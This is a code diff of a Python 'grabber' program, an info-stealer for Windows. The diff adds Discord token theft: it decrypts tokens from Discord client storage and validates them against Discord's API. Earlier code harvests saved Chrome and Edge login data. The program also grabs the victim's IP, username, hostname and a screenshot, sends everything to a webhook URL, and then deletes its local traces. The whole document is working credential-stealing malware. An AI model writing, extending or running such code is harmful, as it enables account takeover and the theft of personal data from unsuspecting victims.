@@ -4,40 +4,84 @@
 """
 
 WEBHOOK_URL = ""
-import win32crypt, requests, zipfile, getpass, sqlite3, shutil, socket, base64, json, mss, os
+import win32crypt, requests, getpass, sqlite3, shutil, socket, base64, json, mss, re, os
 from Crypto.Cipher import AES
 
 LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv('APPDATA')
+ROAMING = os.getenv("APPDATA")
 
 CHROMIUM_DIRS = [
     f"{LOCAL}\\Google\\Chrome",
-    f"{LOCAL}\\Microsoft\\Edge"
+    f"{LOCAL}\\Microsoft\\Edge",
+    f"{LOCAL}\\Google\\Chrome SxS",
+]
+
+DISCORD_DIRS = [
+    f"{ROAMING}\\discord",
+    f"{ROAMING}\\discordcanary",
+    f"{ROAMING}\\Lightcord",
+    f"{ROAMING}\\discordptb",
 ]
 
 data = ""
 
-def findDiscordData():
-    x = os.path.join(ROAMING,'discord','Local Storage','leveldb')
-    if not os.path.exists(x):
-        return
-    for file in os.listdir(x):
-        if file.endswith((".log",".ldb")):
-            with zipfile.ZipFile("discordData.zip",'w') as zipf:
-                zipf.write(os.path.join(x,file))
+def getUserInfo(token:str):
+    if not token: return False
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": token
+    }
+    res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+    return str(res.status_code)[0] == "2", res.text
+
+def findDiscordTokens():
+    tokens = {}
+    for discord in DISCORD_DIRS:
+        localState = f"{discord}\\Local State"
+        leveldb = f"{discord}\\Local Storage\\leveldb"
+        if not os.path.exists(leveldb):
+            continue
+        with open(localState, encoding="utf-8") as f:
+            d = json.load(f)
+        encryptedKey = d["os_crypt"]["encrypted_key"]
+        encryptedKey = encryptedKey.encode("utf-8")
+        encryptedKey = base64.b64decode(encryptedKey)[5:]
+        secretKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
+        for file in os.listdir(leveldb):
+            if not file.endswith((".log",".ldb")):
+                continue
+            with open(os.path.join(leveldb, file), "r", errors="ignore") as file:
+                lines = file.readlines()
+                for line in lines:
+                    for regexLine in re.findall("dQw4w9WgXcQ:[^\"]*", line):
+                        try:
+                            x = base64.b64decode(regexLine.split("dQw4w9WgXcQ:")[1])
+                            initialisationVector = x[3:15]
+                            encryptedToken = x[15:]
+                            cipher = AES.new(secretKey, AES.MODE_GCM, initialisationVector) 
+                            token = cipher.decrypt(encryptedToken)[:-16].decode()
+                            userInfo = getUserInfo(token)
+                            if userInfo[0]:
+                                if token in tokens:
+                                    continue
+                                tokens[token] = userInfo[1]
+                                break
+                        except Exception as e:
+                            continue
+    return tokens
 
 def findChromiumDatas():
     resultStr = "===== Find Chromium Datas =====\n"
     for dir in CHROMIUM_DIRS:
         localState = f"{dir}\\User Data\\Local State"
         if not os.path.exists(localState):
-            return
+            continue
         resultStr += "===== "+dir.split("\\")[-1]+" =====\n"
         with open(localState, encoding="utf-8") as f:
             d = json.load(f)
         profiles = d["profile"]["info_cache"]
         encryptedKey = d["os_crypt"]["encrypted_key"]
-        encryptedKey = encryptedKey.encode('utf-8')
+        encryptedKey = encryptedKey.encode("utf-8")
         encryptedKey = base64.b64decode(encryptedKey)[5:]
         secretKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
         for profileName in profiles:
@@ -63,37 +107,33 @@ def findChromiumDatas():
 def main():
     print("Start....")
     resultStr = findChromiumDatas()
-    with open("resultLoginData.txt", encoding="utf-8", mode="w") as f:
-        f.write(resultStr)
-    findDiscordData()
+    tokens = findDiscordTokens()
     
     ip = requests.get("https://ifconfig.me").text
     useUser = getpass.getuser()
     hostName = socket.gethostname()
     
     monitor = {
-        'left': 0,
-        'top': 0,
-        'width': 1920,
-        'height': 1080
+        "left": 0,
+        "top": 0,
+        "width": 1920,
+        "height": 1080
     }
     with mss.mss() as sct:
         screenshot = sct.grab(monitor)
         mss.tools.to_png(screenshot.rgb, screenshot.size, output="screenshot.png")
-    screenshot = open("screenshot.png", 'rb')
-    discordData = open("discordData.zip", 'rb')
-    resultLoginData = open("resultLoginData.txt", 'rb')
-    
-    files = {'file': screenshot, "file": discordData, "file": resultLoginData}
-    requests.post(WEBHOOK_URL, data={'content': f'# Grabber Result\n```\nIP:{ip}\nUseUser:{useUser}\nHostName:{hostName}```'}, files= {'file': screenshot})
-    requests.post(WEBHOOK_URL, files= {'file': discordData})
-    requests.post(WEBHOOK_URL, files= {'file': resultLoginData})
+    screenshot = open("screenshot.png", "rb")
+    message = f"""# Grabber Result\n```\nIP:{ip}\nUseUser:{useUser}\nHostName:{hostName}```\n## Tokens\n```\n"""
+    for token in tokens:
+        userInfo = json.loads(tokens[token])
+        message += f"""Token - {token}\nUserId - {userInfo["id"]}\nUserName - {userInfo["username"]}\nGlobalName - {userInfo["global_name"]}\nEmail - {userInfo["email"]}\nPhoneNumber - {userInfo["phone"]}\n\n"""
+    message += "```"
+    requests.post(WEBHOOK_URL, data={"content": message}, files= {"file": screenshot})
+    requests.post(WEBHOOK_URL, files= {"file": ("loginData.txt", resultStr.encode())})
     
     screenshot.close()
-    discordData.close()
-    resultLoginData.close()
     
-    files = ["discordData.zip", "loginData", "screenshot.png", "resultLoginData.txt"]
+    files = ["loginData", "screenshot.png"]
     for file in files:
         os.remove(file)
 if __name__ == "__main__":
